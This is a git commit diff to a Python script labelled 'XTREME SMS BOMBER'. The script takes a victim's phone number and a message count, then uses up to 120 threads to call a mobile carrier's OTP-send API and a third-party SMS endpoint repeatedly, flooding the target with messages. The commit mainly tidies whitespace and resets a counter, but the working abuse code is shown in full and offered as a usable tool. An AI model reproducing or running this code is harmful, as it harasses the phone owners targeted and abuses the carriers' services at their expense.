b001f4c97962bf2b0eac60d8ba2a1947680654ec
TmXtreme <157366639+TmXtreme@users.noreply.github.com>
2024-02-02 19:00:18 +0600

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -1,16 +1,14 @@
-import os 
+import os
 import requests
-from concurrent.futures import ThreadPoolExecutor as bff 
+from concurrent.futures import ThreadPoolExecutor as bff
 import sys
-
-send = 0
 
 def logo():
     x = """
            "TOOL":"XTREME SMS BOMBER",
            "OWNER":"@tm_xtreme"
            "VERSION":"1.0"
-           "THREAD":"60" 
+           "THREAD":"60"
     """
     print(x)
 
@@ -25,12 +23,12 @@ def main():
         print("[A]> XTREME BOMBER")
         print("[B]> JOIN CHANNEL")
         x2 = input("[=]> SELECT : ")
-        
+
         if x2.lower() == "a":
             x3 = input("[=]> ENTER NUMBER : ")
             x4 = input("[=]> ENTER LIMIT : ")
             linex()
-            
+
             if x4.isdigit():
                 with bff(max_workers=120) as minhutanhu:
                     try:
@@ -47,8 +45,9 @@ def main():
 
 def boom(nmbr, lmt):
     global send
+    send = 0  # Reset send counter for each bombing process
     try:
-        for i in range(int(lmt)):
+        for _ in range(int(lmt)):
             head1 = {
                 'Host': 'da-api.robi.com.bd',
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 9; i68 Build/P00610; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/387.0.0.13.114;]' 'python-requests/2.31.0',
@@ -59,22 +58,22 @@ def boom(nmbr, lmt):
             data1 = {'msisdn': nmbr}
             url1 = "https://da-api.robi.com.bd/da-nll/otp/send"
             url2 = f"https://api.teamdccs.xyz/sms.php?number={nmbr}"
-            req1 = requests.post(url1, headers=head1, json=data1)
-            req2 = requests.get(url2)
             
+            req1 = requests.post(url1, headers=head1, json=data1)
             if req1.status_code == 200:
                 send += 1
                 print(f"\r[API-1]> STATUS : [200]>[{send}]")
                 linex()
             else:
-                pass 
+                pass
             
+            req2 = requests.get(url2)
             if req2.status_code == 200:
-                send += 1 
+                send += 1
                 print(f"\r[API-2]> STATUS : [200]>[{send}]")
                 linex()
             else:
-                 pass
+                pass
     except Exception as e:
         print(e)
 
